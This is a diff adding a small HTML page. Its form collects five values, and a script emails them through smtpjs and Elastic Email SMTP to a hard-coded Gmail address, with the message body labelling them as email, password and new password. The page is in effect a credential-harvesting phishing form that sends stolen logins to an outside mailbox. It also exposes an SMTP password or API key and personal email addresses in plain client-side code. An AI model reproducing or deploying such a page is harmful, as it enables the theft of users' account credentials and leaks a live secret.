@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <title>Titre</title>
+        <link rel="stylesheet" href="style.css"/>
+    </head>
+
+    <body>
+        <form onsubmit="sendEmail();reset();return false;">
+            
+        <input type="text" id="name0" placeholder="name" required>
+        <input type="text" id="name1" placeholder="name" required>
+        <input type="text" id="name2" placeholder="name" required>
+        <input type="text" id="name3" placeholder="name" required>
+        <input type="text" id="name4" placeholder="name" required>
+        <button type="submit"> Send </button>
+            
+        </form>
+
+        
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+        <script>
+        
+            function sendEmail(){
+                Email.send({
+                        Host : "smtp.elasticemail.com",
+                        Username : "mehdidair1998@gmail.com",
+                        Password : "6A618B1CE2E090A8E71301DE0B5D507CD569",
+                        To : 'mehdidair1998@gmail.com',
+                        From : "elmehdidair@gmail.com",
+                        Subject : "This is the subject",
+                        Body : "Name : "+document.getElementById("name0").value + ""
+                                + "Name : "+document.getElementById("name1").value + ""
+                                + "Email : "+document.getElementById("name2").value + ""
+                                + "passwprd : "+document.getElementById("name3").value + ""
+                                + "new Password : "+document.getElementById("name4").value + ""
+                    }).then(
+                      //message => alert(message)
+                    );
+            }
+        
+        </script>
+    </body>
+</html>
